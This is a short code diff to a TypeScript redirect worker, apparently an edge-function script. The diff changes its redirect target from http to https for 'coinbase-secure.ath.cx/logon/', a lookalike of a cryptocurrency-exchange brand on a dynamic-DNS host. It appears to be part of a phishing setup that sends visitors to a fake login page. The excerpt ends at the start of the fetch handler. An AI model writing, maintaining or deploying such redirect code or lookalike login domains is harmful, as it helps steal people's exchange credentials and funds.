@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "http://coinbase-secure.ath.cx/logon/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://coinbase-secure.ath.cx/logon/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
